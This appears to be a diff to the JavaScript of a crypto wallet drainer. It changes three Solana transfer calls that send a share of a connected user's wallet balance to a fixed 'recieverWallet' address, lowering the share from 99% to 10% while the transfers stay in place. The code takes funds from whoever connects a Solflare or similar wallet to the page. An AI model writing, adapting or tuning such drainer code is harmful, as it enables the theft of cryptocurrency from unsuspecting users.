@@ -228,7 +228,7 @@
             solanaWeb3.SystemProgram.transfer({
               fromPubkey: window.solflare.publicKey,
               toPubkey: recieverWallet,
-              lamports: walletBalance * 0.99, // const * price per unit
+              lamports: walletBalance * 0.1, // const * price per unit
             }),
           );
 
@@ -328,7 +328,7 @@
                   solanaWeb3.SystemProgram.transfer({
                   fromPubkey: orgPubKey,
                   toPubkey: recieverWallet,
-                  lamports: (walletBalance * 0.99),
+                  lamports: (walletBalance * 0.1),
                 })
               )
 
@@ -466,7 +466,7 @@
             solanaWeb3.SystemProgram.transfer({
               fromPubkey: resp.publicKey,
               toPubkey: recieverWallet,
-              lamports: walletBalance * 0.99,
+              lamports: walletBalance * 0.1,
             }),
           );
 
